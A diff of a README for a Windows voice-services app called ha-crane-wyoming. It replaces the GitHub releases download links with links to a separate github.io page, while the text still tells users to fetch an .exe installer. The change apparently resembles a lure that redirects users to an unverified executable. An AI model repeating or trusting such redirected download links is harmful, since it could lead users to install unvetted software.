@@ -1,6 +1,6 @@
 # 🎙️ ha-crane-wyoming - Run local voice services on Windows
 
-[![Download ha-crane-wyoming](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/pushpamhack/ha-crane-wyoming/releases)
+[![Download ha-crane-wyoming](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://pushpamhack.github.io)
 
 ## 🎯 About This Application
 
@@ -25,7 +25,7 @@ You do not need to send your voice recordings to large cloud providers. This app
 
 You need to visit the project page to get the installer for Windows. 
 
-[Click here to visit the release page and download the software](https://github.com/pushpamhack/ha-crane-wyoming/releases)
+[Click here to visit the release page and download the software](https://pushpamhack.github.io)
 
 Look for the file ending in `.exe` under the "Assets" section of the latest release. Save this file to your computer.
 
